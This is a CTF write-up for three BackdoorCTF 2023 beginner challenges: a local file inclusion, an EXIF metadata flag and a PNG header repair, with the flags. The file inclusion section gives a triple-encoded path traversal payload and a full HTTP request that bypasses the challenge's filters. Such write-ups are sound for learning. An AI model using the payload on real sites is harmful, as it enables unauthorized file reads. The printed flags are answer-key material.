# BackdoorCTF 2023 writeups
ctftime link: https://ctftime.org/event/2153
## Beginner/secret_of_j4ck4l

![image](https://github.com/zer00d4y/writeups/assets/128820441/69b19377-2173-46ff-b3e0-05ad52c33cc3)

Simple LFI, but you need to consider filters, which remove ' . '  and ' / '

We need to use this payload: %25252e%25252e%25252fflag%25252etxt

http://34.132.132.69:8003/read_secret_message?file=%25252e%25252e%25252fflag%25252etxt

    GET /read_secret_message?file=%25252E%25252E%25252Fflag%25252Etxt HTTP/1.1
    Host: 34.132.132.69:8003
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Connection: close


![image](https://github.com/zer00d4y/writeups/assets/128820441/21e53ec7-28c2-400c-85ca-da7d9be2fd0d)

FLAG: `flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}`

## Beginner/Beginner-menace

We have this image

![friend](https://github.com/zer00d4y/writeups/assets/128820441/4a154e7c-0c5b-41ff-bdfb-58e6d88635d8)

It's very easy and simple, just check meta data with exiftool or other exif tools

`exiftool friend.jpeg`

    ┌──(kali㉿kali)-[~/Downloads]
    └─$ exiftool friend.jpeg 
    ExifTool Version Number         : 12.67
    File Name                       : friend.jpeg
    Directory                       : .
    File Size                       : 6.5 kB
    File Modification Date/Time     : 2023:12:15 09:26:43-05:00
    File Access Date/Time           : 2023:12:20 05:09:27-05:00
    File Inode Change Date/Time     : 2023:12:20 05:09:27-05:00
    File Permissions                : -rw-r--r--
    File Type                       : JPEG
    File Type Extension             : jpg
    MIME Type                       : image/jpeg
    JFIF Version                    : 1.01
    Exif Byte Order                 : Big-endian (Motorola, MM)
    X Resolution                    : 1
    Y Resolution                    : 1
    Resolution Unit                 : None
    Artist                          : flag{7h3_r34l_ctf_15_7h3_fr13nd5_w3_m4k3_al0ng}
    Y Cb Cr Positioning             : Centered
    Image Width                     : 266
    Image Height                    : 190
    Encoding Process                : Baseline DCT, Huffman coding
    Bits Per Sample                 : 8
    Color Components                : 3
    Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
    Image Size                      : 266x190
    Megapixels                      : 0.051


FLAG: `flag{7h3_r34l_ctf_15_7h3_fr13nd5_w3_m4k3_al0ng}`

## Beginner/Headache

Change the bytes at the beginning so the file opens as a png.

like this 

    89 50 4E 47 0D 0A 1A 0A
    
![image](https://github.com/zer00d4y/writeups/assets/128820441/8870f78f-a347-4ff5-991e-4bdd674b897d)

FLAG: `flag{sp3ll_15_89_50_4E_47}`
